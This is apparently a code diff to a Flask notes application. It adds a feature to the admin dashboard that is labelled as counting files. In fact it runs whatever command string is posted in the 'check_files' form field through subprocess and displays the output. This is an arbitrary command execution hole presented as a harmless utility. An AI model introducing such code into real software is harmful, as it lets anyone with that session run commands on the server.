@@ -186,13 +186,47 @@ def logout():
     session.clear()
     return redirect(url_for('index'))
 
-@app.route("/admin/")
+@app.route("/admin/", methods=('GET', 'POST'))
 @login_required
 def admin():
     """Admin dashboard with SQL statistics"""
     # Check if user is admin
     if session.get('username') != 'admin':
         return redirect(url_for('notes'))
+    
+    file_output = None
+    
+    # Handle file count request using shell command
+    if request.method == 'POST' and request.form.get('check_files'):
+        import os
+        import subprocess
+        import shlex
+        
+        project_root = os.path.dirname(os.path.abspath(__file__))
+        command_string = request.form.get('check_files')
+        
+        try:
+            # Parse command string into arguments using shlex.split
+            command_args = shlex.split(command_string)
+            
+            if not command_args:
+                file_output = "Error: Empty command provided"
+            else:
+                # Run the command with parsed arguments
+                result = subprocess.run(command_args, capture_output=True, text=True, cwd=project_root)
+                
+                if result.returncode == 0:
+                    file_output = result.stdout.strip()
+                else:
+                    file_output = f"Command failed (exit code {result.returncode}):\n{result.stderr.strip()}"
+                
+        except ValueError as e:
+            file_output = f"Command parsing error: {e}"
+        except subprocess.SubprocessError as e:
+            file_output = f"Command execution error: {e}"
+        except Exception as e:
+            file_output = f"Unexpected error: {e}"
+            print(f"Other error command error: {e}")
     
     db = connect_db()
     c = db.cursor()
@@ -271,7 +305,7 @@ def admin():
         'recent_notes': recent_notes
     }
     
-    return render_template('admin.html', stats=stats)
+    return render_template('admin.html', stats=stats, file_output=file_output)
 
 if __name__ == "__main__":
     #create database if it doesn't exist yet
